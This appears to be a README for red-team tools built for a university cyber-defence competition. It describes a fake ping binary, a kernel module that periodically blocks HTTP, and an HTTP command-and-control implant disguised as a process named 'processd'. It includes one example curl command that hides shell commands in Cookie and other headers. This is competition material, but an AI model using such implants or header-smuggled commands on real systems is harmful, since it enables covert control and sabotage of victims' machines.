# Red Team Tools

Each of the tools below was developed by Jack Dunfey for the Internal Lockdown competition at the University at Buffalo.

Each of their folders has an individual README with more information 

## Malicious Ping

This is a C program that can be compiled to replace the ping binary on a system.
It will seem successful for any properly formed IP address or valid DNS name.

<!-- Add images here -->

## HTTP Takedown Kernel Module

This is a kernel module that when installed will block HTTP requests for X minutes every Y minutes. X and Y can be set using macros at the top of the file.

## HTTP C2

Creates a process called processd that runs a program that listens for commands hidden in the headers of an HTTP request

Example Attack:
`curl $VICTIM_IP -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" -H "Cookie: $CMD" -H "Upgrade-Insecure-Requests: $RETURN_PORT" > /dev/null 2>&1`
